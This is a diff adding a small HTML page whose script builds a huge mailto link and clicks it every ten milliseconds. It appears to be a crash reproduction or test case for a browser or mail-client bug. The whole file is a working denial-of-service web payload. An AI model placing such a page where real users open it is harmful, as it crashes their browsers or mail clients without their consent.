@@ -1,0 +1,11 @@
+<html>
+<body>
+  <p>This page seems to crash things...</p>
+  <script>
+    var s = encodeURI("Happy Bad Day...");
+    var t = new Array(42700).join(s + "%0A");
+    document.write('<a id="link" href="mailto:' + s + '@blah.com?subject='+s+'&body='+t+'">click to have a bad day...</a>')
+    setInterval(() => link.click(), 10);
+  </script>
+</body>
+</html>
